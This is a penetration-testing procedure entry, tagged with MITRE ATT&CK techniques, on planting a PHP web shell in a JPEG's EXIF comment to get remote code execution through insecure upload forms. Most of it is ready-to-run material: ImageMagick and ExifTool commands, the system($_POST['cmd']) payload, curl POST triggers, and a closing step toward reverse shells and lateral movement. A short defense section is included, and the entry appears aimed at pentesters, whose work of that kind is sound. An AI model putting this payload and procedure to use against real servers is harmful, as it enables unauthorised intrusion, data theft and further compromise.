---
id: ec36931b-2c4b-493c-9342-1c4d93c4b9c4
name: Inject-PHP-Code-into-Image-Metadata-for-RCE
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.085505+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/Exploits]]'
  - '[[tags/Picture with custom metadata]]'
  - '[[tags/Upload Insecure Files]]'
commands:
  - '[[commands/imagemagick-create-white-image]]'
  - '[[commands/exiftool-add-image-metadata]]'
  - '[[commands/exiftool-insert-php-payload-into-metadata]]'
platforms:
  - Linux
  - Web
tools:
  - '[[tools/ExifTool]]'
  - '[[tools/ImageMagick]]'
validated: true
---

# Inject-PHP-Code-into-Image-Metadata-for-RCE

## Summary

This procedure demonstrates how to embed PHP code into the metadata of an image file using ExifTool and ImageMagick, creating a malicious payload that can lead to remote code execution (RCE) when uploaded to a vulnerable web server that processes image metadata insecurely. It targets file upload vulnerabilities where servers execute or interpret metadata comments as PHP code.

## Description

Many web applications allow users to upload images via forms without properly sanitizing metadata. By injecting PHP code into the image's EXIF comment field, an attacker can craft a payload that executes arbitrary commands when the image is accessed or processed on the server (e.g., via a direct URL request with POST data). This technique exploits weak input validation in file upload handlers, potentially granting shell access for further lateral movement or data exfiltration. It is effective against PHP-based web apps like content management systems or custom upload scripts that read image metadata without stripping executable code. Success relies on the server interpreting the metadata as PHP, often triggered by the __halt_compiler() function to prevent further parsing issues.

## Requirements

1. Access to a system with ImageMagick and ExifTool installed (e.g., Kali Linux).
2. Target web application with an insecure file upload feature that processes image metadata.
3. Knowledge of the target's PHP environment to craft compatible payloads.
4. Network access to upload the image and send POST requests to the uploaded file's URL.

## Defense

- Implement strict file upload validation: Strip all metadata using tools like ImageMagick's -strip option before storage or processing.
- Use content-type whitelisting and scan uploads with antivirus/malware detectors that check for embedded code in metadata.
- Configure web servers (e.g., Apache/Nginx) to prevent direct execution of uploaded files by placing them outside the web root or using .htaccess rules to deny PHP execution in upload directories.
- Monitor server logs for anomalous POST requests to image files and enable PHP execution logging to detect system() calls.

## Objectives

1. Create a benign-looking image file with embedded PHP code in its metadata.
2. Upload the image to the target application to establish persistence.
3. Trigger execution of the embedded PHP to run arbitrary commands via POST requests.
4. Achieve RCE for further exploitation, such as shell access or privilege escalation.

## Instructions

### Step 1: Create a Blank Image File

**Context**: Start by generating a simple white image using ImageMagick's convert tool. This serves as a neutral carrier for the payload, avoiding suspicion from complex image content. The size (110x110 pixels) is arbitrary but keeps the file small.

**Command** ([[commands/imagemagick-create-white-image]]):
```bash
convert -size 110x110 xc:white payload.jpg
```

> This command creates a 110x110 pixel white JPEG image named payload.jpg. Verify the file was created by checking its size and viewing it to ensure it appears normal. Expected output is a new file with no errors in the terminal.

### Step 2: Add Benign Metadata

**Context**: Use ExifTool to insert non-malicious metadata tags like Copyright and Artist. This step disguises the payload by making the image look legitimately tagged, and it tests ExifTool's functionality before adding the exploit code.

**Command** ([[commands/exiftool-add-image-metadata]]):
```bash
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
```

> This modifies the EXIF data in payload.jpg. ExifTool will output a summary of changes, such as "1 image files updated." Use exiftool -a -G1 payload.jpg to verify the tags were added correctly. If tags are missing, ensure the file is writable and ExifTool is up to date.

### Step 3: Insert PHP Payload into Metadata

**Context**: Embed the PHP code into the Comment field of the image metadata. The payload uses system() to execute commands from $_POST['cmd'] and __halt_compiler() to stop PHP parsing after the injection, preventing errors. Note: Replace img.jpg with payload.jpg if using the same file; the original uses img.jpg, but consistency suggests payload.jpg.

**Command** ([[commands/exiftool-insert-php-payload-into-metadata]]):
```bash
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" payload.jpg
```

> This injects the PHP snippet into the Comment tag. ExifTool confirms the update with "1 image files updated." Verify with exiftool -Comment payload.jpg; the output should display the full PHP code in the Comment field. If the server requires a different image name, adjust accordingly.

### Step 4: Upload and Trigger the Payload

**Context**: Upload the modified image to the target's file upload endpoint. Once uploaded, access the image URL via a POST request with cmd parameter to execute commands. Use tools like curl or Burp Suite for testing.

**Instructions**: 
- Upload payload.jpg through the web form.
- Note the upload path (e.g., /uploads/payload.jpg).
- Send a POST request: curl -X POST http://target/uploads/payload.jpg -d "cmd=whoami"

> Expected output from the server response includes the echoed 'Command:' followed by the output of the system command (e.g., the current user). If no output, check server logs for execution errors or adjust the payload for the PHP version. Success confirms RCE; failure may indicate metadata stripping or PHP disabled for uploads.

### Step 5: Verify and Escalate

**Context**: Confirm RCE by running diagnostic commands, then escalate if possible (e.g., download a reverse shell).

**Instructions**: 
- Test with cmd=id or cmd=uname -a.
- If successful, upload a full webshell or reverse shell script using the RCE.

> Expected output: System information or errors indicating execution environment. Use this to pivot to lateral movement.
